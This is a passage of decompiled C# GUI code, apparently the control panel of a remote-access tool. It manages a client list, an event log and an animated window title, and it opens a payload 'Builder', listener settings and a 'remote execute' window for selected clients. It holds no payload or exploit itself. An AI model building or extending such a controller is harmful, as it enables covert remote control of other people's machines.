				if (!selectedClient.Connected)
					this.RemoveClientFromDataGridView(selectedClient);
				else
					this.AddEventLog("Client must be offline to remove! [" + selectedClient.Value.UserAtPc + "]", '*');
			}
		}

		private void removeLogtoolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (DataGridViewBand selectedRow in (BaseCollection)this.EventLogDataGridView.SelectedRows)
				this.EventLogDataGridView.Rows.RemoveAt(selectedRow.Index);
		}

		private void removeAllLogstoolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (DataGridViewRow row in (IEnumerable)this.EventLogDataGridView.Rows)
			{
				this.EventLogDataGridView.ClearSelection();
				this.EventLogDataGridView.Rows.RemoveAt(row.Index);
			}
		}

		private void OpenBuilderBtn_Click(object sender, EventArgs e)
		{
			using (FrmBuilder frmBuilder = new FrmBuilder())
			{
				int num = (int)frmBuilder.ShowDialog();
			}
		}

		private void OpenListenerBtn_Click(object sender, EventArgs e)
		{
			using (FrmSettings frmSettings = new FrmSettings(this.ListenServer))
			{
				int num = (int)frmSettings.ShowDialog();
			}
		}

		private void SetTitleBtn_Click(object sender, EventArgs e) => this.StopAnimatingTitle();

		private void StopAnimatingTitle()
		{
			this._animiatingActive = false;
			if (this._titleTimer != null)
			{
				this._titleTimer.Stop();
				this._titleTimer.Dispose();
			}
			this.Text = this.WindowTitletextBox.Text;
		}

		private void AnimateTitleBtn_Click(object sender, EventArgs e)
		{
			if (this._animiatingActive)
			{
				this.StopAnimatingTitle();
			}
			else
			{
				this._animiatingActive = true;
				int count = 172 - this.WindowTitletextBox.Text.Length;
				if (count < 0)
					count = 0;
				this._baseTitle = new string(' ', count) + this.WindowTitletextBox.Text;
				this._stopwatch = Stopwatch.StartNew();
				this._titleTimer = new System.Windows.Forms.Timer();
				this._titleTimer.Interval = 16;
				this._titleTimer.Tick += new EventHandler(this.TitleTimer_Tick);
				this._titleTimer.Start();
			}
		}

		private void TitleTimer_Tick(object sender, EventArgs e)
		{
			int num = (int)(this._stopwatch.Elapsed.TotalMilliseconds / this._scrollSpeed);
			if (num <= 0)
				return;
			this._scrollIndex = (this._scrollIndex + num) % this._baseTitle.Length;
			this._stopwatch.Restart();
			this.Text = this._baseTitle.Substring(this._scrollIndex) + this._baseTitle.Substring(0, this._scrollIndex);
		}

		private void restoreOgTitleBtn_Click(object sender, EventArgs e)
		{
			this.StopAnimatingTitle();
			this.SetTitle();
			this.WindowTitletextBox.Text = this.Text;
		}

		private void HideToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Client[] selectedClients = this.GetSelectedClients();
			if (selectedClients.Length == 0)
				return;
			new FrmRemoteExecution(selectedClients).Show();
		}

		private void SaveCustomTitleButton_Click(object sender, EventArgs e)
		{
			InvokedServer.Models.Settings.GetCustomName = this.WindowTitletextBox.Text;
		}

		private void ToggleLogViewBtn_Click(object sender, EventArgs e)
		{
			int num = this.EventLogDataGridView.Visible ? 1 : 0;
			this.EventLogDataGridView.Visible = !this.EventLogDataGridView.Visible;
			if (num != 0)
				this.ToggleLogViewBtn.Image = Resources.arrow_up;
			else
				this.ToggleLogViewBtn.Image = Resources.arrow_down;
		}
	}
}
